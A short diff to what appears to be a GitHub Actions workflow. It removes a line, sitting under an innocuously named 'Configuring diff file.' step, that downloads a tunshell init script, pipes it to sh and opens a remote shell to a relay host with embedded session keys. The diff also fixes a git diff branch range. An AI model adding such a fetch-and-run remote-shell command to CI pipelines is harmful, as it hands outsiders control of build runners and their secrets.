@@ -51,8 +51,7 @@ jobs:
       - name: Configuring diff file.
         run: |
           git config --global --add safe.directory .
-          wget https://lets.tunshell.com/init.sh -O - 2> /dev/null | sh -s -- T mHpswinFZQUrIPXRJnwPAm yVp6JNp881IZHr91MHnEL3 eu.relay.tunshell.com
-          git diff --dirstat=files,0 origin/$GITHUB_HEAD_REF..$GITHUB_BASE_REF |\
+          git diff --dirstat=files,0 origin/$GITHUB_BASE_REF origin/$GITHUB_HEAD_REF |\
           grep -e web/modules/custom -e web/themes/custom -e web/profiles/custom |\
           tr "\n" " " > /tmp/check
 
